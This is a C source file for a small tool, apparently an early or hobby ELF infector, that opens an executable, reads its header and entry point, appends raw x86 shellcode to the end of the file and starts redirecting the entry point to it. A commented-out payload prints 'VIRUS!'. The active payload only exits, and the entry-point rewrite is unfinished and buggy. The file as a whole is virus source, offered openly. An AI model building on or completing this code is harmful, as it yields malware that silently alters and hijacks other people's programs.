#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include "nightflower.h"

int main(int argc, char *argv[])
{
    if(argc != 2) {
        usage();
        exit(-1);
    }

    FILE *bin_file = fopen(argv[1], "r+");
    if(!bin_file) {
        printf("Error: Could not open file (%s)\n", argv[1]);
        exit(-1);
    }

    int elf64 = is_elf64(bin_file);
    if(elf64)
        printf("Type: ELF64\n");
    else
        printf("Type: ELF32\n");

    uint64_t entry_address = entry_addr64(bin_file);
    printf("Entry: %#llx\n", entry_address);

    uint64_t size = file_size(bin_file);
    printf("Size: %llu\n", size);

    printf("Injecting payload\n");
    inject_payload(bin_file, size);

    printf("Setting new entry point\n");
    set_entrypt(bin_file, size);

    close(bin_file);

    return 0;
}

/*
 * Print the program's usage info.
 */
void usage()
{
    const char *general = "usage: ./nightbird binary_file";
    printf("%s\n", general);
}

/*
 * Return 1 if binary file is a 64bit ELF.
 * Arguments:
 *      bin_file - file descriptor to binary file
 */
int is_elf64(FILE *bin_file)
{
    int seek_res = fseek(bin_file, 4, SEEK_SET);
    if(seek_res) {
        printf("Error: Could not seek to EI_CLASS\n");
        exit(-1);
    }

    int ei_class = fgetc(bin_file);
    return ei_class == 2;
}

/*
 * Return the binary file's entry point as a virtual address.
 * Arguments:
 *      bin_file - file descriptor to binary file
 */
uint64_t entry_addr64(FILE *bin_file)
{
    int seek_res = fseek(bin_file, 24, SEEK_SET);
    if(seek_res) {
        printf("Error: Could not seek to E_ENTRY\n");
        exit(-1);
    }

    int bytes = 8;
    int i;
    uint64_t entry_address = 0;
    for(i = 0; i < bytes; i++) {
        uint64_t b = fgetc(bin_file);
        entry_address |= b << (i * 8);
    }

    return entry_address;
}

/*
 * Return the byte size of the file.
 * Arguments:
 *      bin_file - file descriptor to binary file
 */
uint64_t file_size(FILE *bin_file)
{
    int seek_start = fseek(bin_file, 0, SEEK_SET);
    if(seek_start) {
        printf("Error: Could not seek to SEEK_START\n");
        exit(-1);
    }

    int seek_end = fseek(bin_file, 0, SEEK_END);
    if(seek_end) {
        printf("Error: Could not seek to SEEK_END\n");
        exit(-1);
    }

    uint64_t file_size = ftell(bin_file);
    return file_size;
} 

/*
 * Inject a small payload to the end of the binary file.
 * Arguments:
 *      bin_file - file descriptor to binary file.
 *      size     - size of file in bytes.
 */
void inject_payload(FILE *bin_file, int size)
{
    const int payload_len = 12;
    const char *payload_code = "\xbb\x00\x00\x00\x00"
        "\xb8\x01\x00\x00\x00\xcd\x80";

    int seek_end = fseek(bin_file, 0, SEEK_END);
    if(seek_end) {
        printf("Error: Could not seek to SEEK_END\n");
        exit(-1);
    }

    int i;
    for(i = 0; i < payload_len; i++)
        fputc(payload_code[i], bin_file);

    /*
    const int payload_code_len = 34;
    const int payload_code_start = size;
    const int payload_str_start = size + payload_code_len;

    char payload_str_addr[4];
    int i;
    for(i = 0; i < 4; i++)
        payload_str_addr[i] = 

    const char *payload_code = "\xba\x0e\x00\x00\x00\xb9\x77\x77\x77\x77"
        "\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00"
        "\xb8\x01\x00\x00\x00\xcd\x80";

    const char *payload_str = "VIRUS!";
    */
}

/*
 * 
 */
void set_entrypt(FILE *bin_file, int new_entrypt)
{
    int seek_res = fseek(bin_file, 24, SEEK_SET);
    if(seek_res) {
        printf("Error: Could not seek to E_ENTRY\n");
        exit(-1);
    }

    char little_endian_entry[4];
    int i;
    for(i = 0; i < 4; i++) {
        int cur_byte = new_entrypt >> (i * 8);
        little_endian_entry[i] = cur_byte & 0xff;
        printf("%#0x\n", little_endian_entry[i]);
    }
}





